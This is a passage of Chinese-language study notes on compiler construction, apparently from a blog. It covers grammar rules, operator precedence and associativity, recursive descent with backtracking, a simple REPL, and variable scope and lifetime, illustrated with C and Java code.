c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add -&gt; mul | add + mul   <span class="comment">//add 可以替换成 mul，或者 add + mul。</span></span><br><span class="line"><span class="comment">//这样的替换过程又叫做“推导”</span></span><br><span class="line"></span><br><span class="line">mul -&gt; pri | mul * pri</span><br><span class="line">pri -&gt; Id | Num | (add)</span><br><span class="line"><span class="comment">//实际BNF写成下面这样</span></span><br><span class="line">add ::= mul | add + mul</span><br><span class="line">mul ::= pri | mul * pri</span><br><span class="line">pri ::= Id | Num | (add)</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面EBNF这个规则中运用了 * 号，来表示这个部分可以重复 0 到多次：</span></span><br><span class="line">add -&gt; mul (+ mul)*</span><br></pre></td></tr></table></figure><p>  以“2+3*5” 和 “2+3+4”这两个算术表达式为例，这两个算术表达式的推导过程分别如下图所示：</p>  <img src="/2022/07/08/CompilerNote/Untitled12.png" class title="Untitled"><p>  上图Num、+ 和 * 都是<code>终结符</code>，终结符都是词法分析中产生的<code>Token</code>。而那些非叶子节点，就是<code>非终结符</code>。文法的推导过程，就是把非终结符不断替换的过程，让最后的结果没有非终结符，只有终结符。</p></li><li><p>确保正确的优先级Priority</p><ul><li>优先级是通过在语法推导中的层次来决定的，优先级越低的，越先尝试推导。</li></ul><p>  应该把关系运算（&gt;、&#x3D;、&lt;）放在加法的上层，逻辑运算（and、or）放在关系运算的上层。的确如此，我们试着将它写出来：</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exp</span> -&gt; or | or = <span class="built_in">exp</span></span><br><span class="line"><span class="comment">//or = exp 也就是一个or表达式，跟等号token，跟另一个表达式。</span></span><br><span class="line">or -&gt; and | or || and</span><br><span class="line">and -&gt; equal | and &amp;&amp; equal</span><br><span class="line">equal -&gt; rel | equal == rel | equal != rel</span><br><span class="line">rel -&gt; add | rel &gt; add | rel &lt; add | rel &gt;= add | rel &lt;= add</span><br><span class="line">add -&gt; mul | add + mul | add - mul </span><br><span class="line">mul -&gt; pri | mul * pri | mul / pri</span><br><span class="line"><span class="comment">//这里表达的优先级从低到高是：</span></span><br><span class="line"><span class="comment">//赋值运算、逻辑运算（or）、逻辑运算（and）、相等比较（equal）、大小比较（rel）、</span></span><br><span class="line"><span class="comment">//加法运算（add）、乘法运算（mul）和基础表达式（pri）。</span></span><br><span class="line"></span><br><span class="line">pri -&gt; Id | Literal | (<span class="built_in">exp</span>)</span><br><span class="line"><span class="comment">//基础表达式用括号把表达式包裹起来，递归地引用表达式就可以了。</span></span><br><span class="line"><span class="comment">//这样的话，只要在解析表达式的时候遇到括号，那么就知道这个是最优先的</span></span><br></pre></td></tr></table></figure></li><li><p>确保正确的结合性Associativity</p><ul><li>结合性是跟左递归还是右递归有关的，左递归导致左结合，右递归导致右结合。</li><li>左递归可以通过改写语法规则来避免，而改写后的语法又可以表达成简洁的 EBNF 格式，从而启发我们用循环代替右递归。</li></ul><p>  见的加减乘除等算术运算是左结合的，“.”符号也是左结合的。规律：<strong>对于左结合的运算符，递归项要放在左边；而右结合的运算符，递归项放在右边。</strong></p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//所以加法表达式规则应该</span></span><br><span class="line">add -&gt; mul | add + mul</span><br><span class="line"><span class="comment">//还要消除左递归，现在我们改写成:</span></span><br><span class="line">add -&gt; mul add<span class="number">&#x27;</span></span><br><span class="line">add<span class="number">&#x27;</span> -&gt; + mul add<span class="number">&#x27;</span> | ε</span><br><span class="line"><span class="comment">//文法中，ε（读作 epsilon）是空集的意思</span></span><br></pre></td></tr></table></figure><p>  接下来，我们用刚刚改写的规则再次推导一下 “2+3+4”这个表达式，得到了下图中左边的结果：</p>  <img src="/2022/07/08/CompilerNote/Untitled13.png" class title="Untitled"><p>  由于 add’的规则是右递归的，如果用标准的递归下降算法，我们会跟上一讲一样，又会出现运算符结合性的错误。我们期待的 AST 是右边的那棵，它的结合性才是正确的。那么有没有解决办法呢？答案是有的。我们仔细分析一下上面语法规则的推导过程。只有第一步是按照 add 规则推导，之后都是按照 add’规则推导，一直到结束。</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add -&gt; mul (+ mul)*</span><br><span class="line"><span class="comment">//对于 (+ mul)* 这部分，我们其实可以写成一个循环，而不是一次次的递归调用,如下</span></span><br><span class="line">mul();</span><br><span class="line"><span class="keyword">while</span>(next token is +)&#123;</span><br><span class="line">  mul()</span><br><span class="line">  createAddNode</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  有一个概念叫做<strong>尾递归，</strong>尾递归函数的最后一句是递归地调用自身。编译程序通常都会把尾递归转化为一个循环语句，使用的原理跟上面的伪代码是一样的。具体代码:</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">private SimpleASTNode <span class="title function_">additive</span><span class="params">(TokenReader tokens)</span>throws Exception&#123;</span><br><span class="line">SimpleASTNode child1 = multiplicative(tokens); <span class="comment">// 应用 add 规则</span></span><br><span class="line">SimpleASTNode node = child1 ; </span><br><span class="line"><span class="keyword">if</span>(child1 != null)&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123; <span class="comment">// 循环应用 add&#x27;</span></span><br><span class="line">Token token = tokens.peek();</span><br><span class="line"><span class="keyword">if</span>(token != null &amp;&amp; (token.getType() == TokenType.Plus || token.getType() == TokenType.Minus))&#123;</span><br><span class="line">token = tokens.read();              <span class="comment">// 读出加号</span></span><br><span class="line">                SimpleASTNode child2 = multiplicative(tokens);  <span class="comment">// 计算下级节点</span></span><br><span class="line">                node = new SimpleASTNode(ASTNodeType.Additive, token.getText());</span><br><span class="line">                node.addChild(child1);              <span class="comment">// 注意，新节点在顶层，保证正确的结合性</span></span><br><span class="line">                node.addChild(child2);</span><br><span class="line">                child1 = node;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>理解递归下降算法中的回溯</p><p>  考虑一下 age &#x3D; 45；这个语句</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对 statement 语句的定义：</span></span><br><span class="line">statement</span><br><span class="line">: intDeclaration 变量声明语句</span><br><span class="line">| expressionStatement 表达式语句</span><br><span class="line">| assignmentStatement  赋值语句</span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>  语句不是以 int 开头的，所以这个尝试会返回 null。然后我们接着尝试 expressionStatement：</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">private SimpleASTNode <span class="title function_">expressionStatement</span><span class="params">()</span> throws Exception &#123;</span><br><span class="line">        <span class="type">int</span> pos = tokens.getPosition();  <span class="comment">// 记下初始位置</span></span><br><span class="line">        SimpleASTNode node = additive(); <span class="comment">// 匹配加法规则</span></span><br><span class="line">        <span class="keyword">if</span> (node != null) &#123;</span><br><span class="line">            Token token = tokens.peek();</span><br><span class="line">            <span class="keyword">if</span> (token != null &amp;&amp; token.getType() == TokenType.SemiColon) &#123;   </span><br><span class="line"><span class="comment">// 要求一定以分号结尾</span></span><br><span class="line">                tokens.read();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                node = null;</span><br><span class="line">                tokens.setPosition(pos); <span class="comment">// 回溯</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>  语句最左边是一个标识符。根据我们的语法规则，标识符是一个合法的 addtiveExpresion，因此 additive() 函数返回一个非空值。接下来，后面应该扫描到一个分号才对，但是显然不是，标识符后面跟的是等号，这证明模式匹配失败。</p><p>  <strong>尝试一个规则不成功之后，恢复到原样，再去尝试另外的规则，这个现象就叫做“回溯”。</strong></p></li><li><p>实现简单的输入、执行、打印的循环过程:REPL（Read-Eval-Print Loop）</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">SimpleParser parser = new SimpleParser();</span><br><span class="line">SimpleScript script = new SimpleScript();</span><br><span class="line">ByfferedReader reader = new BufferedReader(new InputStreamReader(System.in))</span><br><span class="line"><span class="comment">//从终端获取输入</span></span><br><span class="line">String scriptText = <span class="string">&quot;&quot;</span>;</span><br><span class="line">System.out.print(<span class="string">&quot;\n&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(True)&#123;</span><br><span class="line">try &#123;</span><br><span class="line">        String line = reader.readLine().trim(); <span class="comment">// 读入一行</span></span><br><span class="line">        <span class="keyword">if</span> (line.equals(<span class="string">&quot;exit();&quot;</span>)) &#123;   <span class="comment">// 硬编码退出条件</span></span><br><span class="line">            System.out.println(<span class="string">&quot;good bye!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        scriptText += line + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (line.endsWith(<span class="string">&quot;;&quot;</span>)) &#123; <span class="comment">// 如果没有遇到分号的话，会再读一行</span></span><br><span class="line">            ASTNode tree = parser.parse(scriptText); <span class="comment">// 语法解析</span></span><br><span class="line">            <span class="keyword">if</span> (verbose) &#123;</span><br><span class="line">                parser.dumpAST(tree, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          </span><br><span class="line">            script.evaluate(tree, <span class="string">&quot;&quot;</span>); <span class="comment">// 对 AST 求值，并打印</span></span><br><span class="line"> </span><br><span class="line">            System.out.print(<span class="string">&quot;\n&gt;&quot;</span>);   <span class="comment">// 显示一个提示符</span></span><br><span class="line"></span><br><span class="line">            scriptText = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125; catch (Exception e) &#123; <span class="comment">// 如果发现语法错误，报错，然后可以继续执行</span></span><br><span class="line">        System.out.println(e.getLocalizedMessage());</span><br><span class="line">        System.out.print(<span class="string">&quot;\n&gt;&quot;</span>);   <span class="comment">// 提示符</span></span><br><span class="line">        scriptText = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  调试一下</p></li><li><p>设计类的语法</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">classDeclaration</span><br><span class="line">    : CLASS IDENTIFIER  <span class="comment">//类声明以 class 关键字开头,有一个标识符是类型名称</span></span><br><span class="line">      (EXTENDS typeType)?</span><br><span class="line">      (IMPLEMENTS typeList)?</span><br><span class="line">      classBody <span class="comment">//后面跟着类的主体</span></span><br><span class="line">    ;</span><br><span class="line"> </span><br><span class="line">classBody</span><br><span class="line">    : <span class="string">&#x27;&#123;&#x27;</span> classBodyDeclaration* <span class="string">&#x27;&#125;&#x27;</span> <span class="comment">//类的主体里要声明类的成员</span></span><br><span class="line">    ;</span><br><span class="line"> </span><br><span class="line">classBodyDeclaration</span><br><span class="line">    : <span class="string">&#x27;;&#x27;</span></span><br><span class="line">    | memberDeclaration <span class="comment">//类的成员变量的声明和普通变量声明在语法上没什么区别。</span></span><br><span class="line">    ;</span><br><span class="line"> <span class="comment">//在简化的情况下，可以只关注类的属性和方法两种成员。</span></span><br><span class="line"><span class="comment">//把类的方法 function，而不是 method，是想把对象方法和函数做一些统一的设计。</span></span><br><span class="line">memberDeclaration</span><br><span class="line">    : functionDeclaration</span><br><span class="line">    | fieldDeclaration</span><br><span class="line">    ;</span><br><span class="line"> </span><br><span class="line">functionDeclaration <span class="comment">//函数声明现在的角色是类的方法</span></span><br><span class="line">    : typeTypeOrVoid IDENTIFIER <span class="title function_">formalParameters</span> <span class="params">(<span class="string">&#x27;[&#x27;</span> <span class="string">&#x27;]&#x27;</span>)</span>*</span><br><span class="line">      (THROWS qualifiedNameList)?</span><br><span class="line">      functionBody/</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>编写语义分析器</p><p>  两种解释都是可以的时候，我们只有联系上下文才能知道它的准确含义。消除语义模糊，生成一些属性信息，让计算机能够依据这些信息生成目标代码。例如：</p><ul><li><p>某个表达式的计算结果是什么数据类型？如果有<strong>数据类型不匹配的情况</strong>，是否要做自动转换？</p></li><li><p>如果在一个<strong>代码块的内部和外部有相同名称的变量</strong>，我在执行的时候到底用哪个？ 就像“我喜欢又聪明又勇敢的你”中的“你”，到底指的是谁，需要明确。</p></li><li><p>在同一个作用域内，不允许有两个名称相同的变量，这是<strong>唯一性检查</strong>。你不能刚声明一个变量 a，紧接着又声明同样名称的一个变量 a，这就不允许了。</p></li><li><p>生存期&amp;作用域</p><p>  思考问题</p><ul><li><p>闭包的机理到底是什么？</p><ul><li>变量的使用范围由作用域决定，作用域由词法规则决定，词法分析生成作用域链，之后查找变量就沿着这条作用域链查找，与函数调用栈就没有关系了。一般函数的生存期就是出栈后就结束了，如果是引用对象会在本次GC中回收，如果产生了闭包，那就要<strong>等到引用闭包的变量销毁，生存期才结束</strong>。</li></ul></li><li><p>为什么需要栈和堆两种机制来管理内存？它们的区别又是什么？</p></li><li><p>一个静态的内部类和普通的内部类有什么区别？</p></li><li><p>作用域 Scope、<strong><strong>实现作用域和栈</strong></strong></p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">fun</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    a = <span class="number">2</span>;<span class="comment">//全局a</span></span><br><span class="line">    <span class="comment">//b = 3;   // 出错，不知道 b 是谁</span></span><br><span class="line">    <span class="type">int</span> a = <span class="number">3</span>; <span class="comment">// 允许声明一个同名的变量吗？ 本地a</span></span><br><span class="line">    <span class="type">int</span> b = a; <span class="comment">// 这里的 a 是哪个？ 本地a</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;in fun: a=%d b=%d \n&quot;</span>, a, b);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> b = <span class="number">4</span>; <span class="comment">//b 的作用域从这里开始</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main--1: a=%d b=%d \n&quot;</span>, a, b);</span><br><span class="line"> </span><br><span class="line">    fun();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main--2: a=%d b=%d \n&quot;</span>, a, b);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 用本地变量覆盖全局变量</span></span><br><span class="line">    <span class="type">int</span> a = <span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main--3: a=%d b=%d \n&quot;</span>, a, b);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 测试块作用域</span></span><br><span class="line">    <span class="keyword">if</span> (a &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="type">int</span> b = <span class="number">3</span>; <span class="comment">// 允许在块里覆盖外面的变量 本地b</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;main--4: a=%d b=%d \n&quot;</span>, a, b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">int</span> b = <span class="number">4</span>; <span class="comment">// 跟 if 块里的 b 是两个不同的变量</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;main--5: a=%d b=%d \n&quot;</span>, a, b);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main--6: a=%d b=%d \n&quot;</span>, a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line">main-<span class="number">-1</span>: a=<span class="number">1</span> b=<span class="number">4</span> </span><br><span class="line">in fun: a=<span class="number">3</span> b=<span class="number">3</span> </span><br><span class="line">main-<span class="number">-2</span>: a=<span class="number">2</span> b=<span class="number">4</span> </span><br><span class="line">main-<span class="number">-3</span>: a=<span class="number">5</span> b=<span class="number">5</span> </span><br><span class="line">main-<span class="number">-4</span>: a=<span class="number">5</span> b=<span class="number">3</span> </span><br><span class="line">main-<span class="number">-6</span>: a=<span class="number">5</span> b=<span class="number">5</span></span><br></pre></td></tr></table></figure>  <img src="/2022/07/08/CompilerNote/Untitled14.png" class title="Untitled"><p>  java不允许块作用域里的变量覆盖外部变量 , JavaScript 是没有块作用域的。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过HashMap保存各个变量的值</span></span><br><span class="line"><span class="keyword">private</span> Stack&lt;StackFrame&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;StackFrame&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StackFrame</span> &#123;</span><br><span class="line"><span class="type">Scope</span> <span class="variable">scope</span> <span class="operator">=</span> <span class="literal">null</span>; <span class="comment">// 该 frame 所对应的 scope</span></span><br><span class="line"><span class="type">StackFrame</span> <span class="variable">parentFrame</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="comment">//enclosingScope 所对应的 frame</span></span><br><span class="line"><span class="type">PlayObject</span> <span class="variable">object</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="comment">// 实际存放变量的地方</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PlayObject</span>&#123;</span><br><span class="line"><span class="comment">// 成员变量</span></span><br><span class="line"><span class="keyword">protected</span> Map&lt;Variable,Object&gt; fields = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Variable,Object&gt;();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现块作用域</span></span><br><span class="line"><span class="type">BlockScope</span> <span class="variable">scope</span> <span class="operator">=</span> (BlockScope) cr.node2Scope.get(ctx);  <span class="comment">// 获得 Scope</span></span><br><span class="line"><span class="comment">//ctx = Context</span></span><br><span class="line"><span class="type">StackFrame</span> <span class="variable">frame</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StackFrame</span>(scope);  <span class="comment">// 创建一个栈桢</span></span><br><span class="line">pushStack(frame);    <span class="comment">// 加入栈中</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// 运行完毕，弹出栈</span></span><br><span class="line">stack.pop();</span><br><span class="line"></span><br><span class="line"><span class="comment">//当需要获取某个变量的值的时候</span></span><br><span class="line"><span class="type">StackFrame</span> <span class="variable">f</span> <span class="operator">=</span> stack.peek();<span class="comment">// 获取栈顶的桢</span></span><br><span class="line"><span class="type">PlayObject</span> <span class="variable">valueContainer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">while</span>(f != <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="comment">// 看变量是否属于当前栈桢里</span></span><br><span class="line"><span class="keyword">if</span>(f.scope.containsSymbol(variable))&#123;</span><br><span class="line">valueContainer = f.object;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 从上一级 scope 对应的栈桢里去找</span></span><br><span class="line">f = f.parentFrame;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>生存期 Extent</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> * <span class="title function_">fun</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> * b = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">1</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>)); <span class="comment">// 在堆中申请内存</span></span><br><span class="line">    *b = <span class="number">2</span>;  <span class="comment">// 给该地址赋值 2</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    <span class="type">int</span> * p = fun(); <span class="comment">//返回指向堆区保存着2的栈地址</span></span><br><span class="line">    *p = <span class="number">3</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;after called fun: b=%lu *b=%d \n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)p, *p);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Extent2</span>&#123;</span><br><span class="line"> </span><br><span class="line">    StringBuffer <span class="title function_">myMethod</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(); <span class="comment">// 在堆中生成对象实例</span></span><br><span class="line">        b.append(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">        System.out.println(System.identityHashCode(b)); <span class="comment">// 打印内存地址</span></span><br><span class="line">        <span class="keyword">return</span> b;  <span class="comment">// 返回对象引用，本质是一个内存地址</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">        <span class="type">Extent2</span> <span class="variable">extent2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Extent2</span>();</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">c</span> <span class="operator">=</span> extent2.myMethod(); <span class="comment">// 获得对象引用</span></span><br><span class="line">        System.out.println(c);</span><br><span class="line">        c.append(<span class="string">&quot;World!&quot;</span>);         <span class="comment">// 修改内存中的内容</span></span><br><span class="line">        System.out.println(c);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 跟在 myMethod() 中打印的值相同</span></span><br><span class="line">        System.out.println(System.identityHashCode(c));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//java 对象所采用的内存超出了申请内存时所在的作用域，所以也就没有办法自动收回。</span></span><br><span class="line"><span class="comment">//所以 Java 采用的是自动内存管理机制，也就是垃圾回收技术。</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>引用的消解</p><p>  在程序里使用变量、函数、类等符号时，我们需要知道它们指的是谁，要能对应到定义它们的地方。下面的例子中，当使用变量 a 时，我们需要知道它是全局变量 a，还是 fun() 函数中的本地变量 a。因为不同作用域里可能有相同名称的变量，所以必须找到正确的那个。这个过程，可以叫引用消解。</p><p>  